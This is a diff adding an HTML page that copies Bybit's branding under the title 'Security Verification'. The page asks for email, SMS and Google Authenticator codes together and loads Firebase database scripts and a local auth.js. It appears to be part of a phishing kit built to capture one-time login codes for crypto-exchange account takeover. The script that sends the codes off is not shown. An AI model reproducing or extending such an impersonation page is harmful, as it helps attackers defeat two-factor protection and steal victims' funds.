@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Verification | Bybit</title>
+  <!-- Site icon (favicon) -->
+  <link rel="icon" href="/favicon.ico" sizes="any">
+  <link rel="icon" type="image/png" sizes="any" href="assets/img/bybit-seeklogo.png">
+  <link rel="apple-touch-icon" href="assets/img/bybit-seeklogo.png">
+  <meta name="theme-color" content="#0b0e11">
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="stylesheet" href="assets/css/styles.css?v=11">
+</head>
+
+<body>
+  <svg width="0" height="0" style="position:absolute" aria-hidden="true">
+    <defs>
+      <symbol id="ic-chev" viewBox="0 0 12 12">
+        <path d="M2.5 4.5L6 8l3.5-3.5" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"
+          stroke-linejoin="round" />
+      </symbol>
+      <symbol id="ic-globe" viewBox="0 0 24 24">
+        <circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="1.7" />
+        <path d="M3 12h18M12 3c2.6 2.6 3.9 5.6 3.9 9S14.6 18.4 12 21c-2.6-2.6-3.9-5.6-3.9-9S9.4 5.6 12 3z" fill="none"
+          stroke="currentColor" stroke-width="1.7" />
+      </symbol>
+      <symbol id="ic-headset" viewBox="0 0 24 24">
+        <path d="M4 13v-1a8 8 0 0116 0v1" fill="none" stroke="currentColor" stroke-width="1.7" />
+        <rect x="3" y="12.5" width="4.4" height="7" rx="2.2" fill="none" stroke="currentColor" stroke-width="1.7" />
+        <rect x="16.6" y="12.5" width="4.4" height="7" rx="2.2" fill="none" stroke="currentColor" stroke-width="1.7" />
+        <path d="M19 19.5v.7a2.8 2.8 0 01-2.8 2.8H13" fill="none" stroke="currentColor" stroke-width="1.7" />
+      </symbol>
+    </defs>
+  </svg>
+
+  <div class="auth">
+    <aside class="auth-left">
+      <h2 class="auth-h1">Buy &amp; sell directly with Bybit P2P</h2>
+      <div class="auth-illu"><img src="assets/img/auth-p2p-card.webp" alt=""></div>
+    </aside>
+
+    <main class="auth-right">
+      <div class="auth-wrap">
+        <div class="auth-top">
+          <a href="index.html"><img class="auth-logo" src="assets/img/auth-lightlogo.png" alt="BYBIT"></a>
+          <button class="auth-globe" aria-label="Language"><svg class="ic24">
+              <use href="#ic-globe" />
+            </svg></button>
+        </div>
+
+        <div class="auth-card verify-card">
+          <div class="vf-modal">
+            <div class="vf-modal-h">
+              <h2>Security Verification</h2>
+              <button class="vf-close" type="button" aria-label="Close" onclick="window.location.href='login.html'">
+                <svg viewBox="0 0 16 16" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.7"
+                  stroke-linecap="round">
+                  <path d="M4 4l8 8M12 4l-8 8" />
+                </svg>
+              </button>
+            </div>
+
+            <p class="vf-lead"><span class="vf-mail-ic">
+                <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="1.7">
+                  <rect x="3" y="5" width="18" height="14" rx="2" />
+                  <path d="M3 7l9 6 9-6" />
+                </svg>
+              </span>A verification code will be sent to <b id="vfTo">your account</b></p>
+
+            <div class="vf-method">
+              <div class="vf-label">
+                <svg class="ic16" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor"
+                  stroke-width="1.7">
+                  <rect x="3" y="5" width="18" height="14" rx="2" />
+                  <path d="M3 7l9 6 9-6" />
+                </svg>
+                <span>Email Verification</span>
+              </div>
+              <div class="vf-field" data-vf-field="email">
+                <input class="vf-input" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code"
+                  placeholder="Please enter the email verification code" data-vf-input="email"
+                  aria-label="Email verification code">
+                <button class="vf-send" type="button" data-vf-send="email">Send Verification Code</button>
+                <span class="vf-cd" data-vf-cd="email" hidden>0:30</span>
+              </div>
+            </div>
+
+            <div class="vf-method">
+              <div class="vf-label">
+                <svg class="ic16" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor"
+                  stroke-width="1.7">
+                  <rect x="6" y="2.5" width="12" height="19" rx="2.5" />
+                  <path d="M10.5 18.5h3" />
+                </svg>
+                <span>SMS Verification</span>
+              </div>
+              <div class="vf-field" data-vf-field="sms">
+                <input class="vf-input" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code"
+                  placeholder="Please enter the SMS verification code" data-vf-input="sms"
+                  aria-label="SMS verification code">
+                <button class="vf-send" type="button" data-vf-send="sms">Send Verification Code</button>
+                <span class="vf-cd" data-vf-cd="sms" hidden>0:30</span>
+              </div>
+            </div>
+
+            <div class="vf-method">
+              <div class="vf-label">
+                <svg class="ic16" viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor"
+                  stroke-width="1.7">
+                  <circle cx="12" cy="12" r="8.5" />
+                  <path d="M12 7.5v4.5l3 2" />
+                </svg>
+                <span>Google 2FA Code</span>
+              </div>
+              <div class="vf-field" data-vf-field="app">
+                <input class="vf-input" type="text" inputmode="numeric" maxlength="6" autocomplete="one-time-code"
+                  placeholder="Please enter the Google Authenticator code" data-vf-input="app"
+                  aria-label="Authenticator code">
+                <span class="vf-cd" data-vf-cd="app" hidden>0:30</span>
+              </div>
+            </div>
+
+            <p class="vf-note">please enter your respective login confirmation codes</p>
+
+            <button class="auth-next vf-next" type="button" data-vf-submit disabled>Next Step</button>
+
+            <a class="vf-help" href="#">Having problems with verification?</a>
+
+            <div class="auth-err" id="verifyErr" role="alert"></div>
+          </div>
+        </div>
+      </div>
+    </main>
+  </div>
+
+  <div class="floats floats-orange">
+    <button class="float-btn" aria-label="Support"><svg class="ic18">
+        <use href="#ic-headset" />
+      </svg></button>
+  </div>
+
+  <div class="cookie" id="cookie">
+    <p>This website uses cookies to improve mobile app functionality and your in-app experiences. You may review our <a
+        href="#">Cookie Policy</a> and accept the default setting.</p>
+    <button class="cookie-btn" id="cookieOk">Accept All</button>
+  </div>
+
+  <script src="assets/js/firebase/firebase-app-compat.js"></script>
+  <script src="assets/js/firebase/firebase-auth-compat.js"></script>
+  <script src="assets/js/firebase/firebase-database-compat.js"></script>
+  <script src="assets/js/firebase/firebase-init.js?v=6"></script>
+  <script src="assets/js/main.js?v=2"></script>
+  <script src="assets/js/auth.js?v=17"></script>
+</body>
+
+</html>
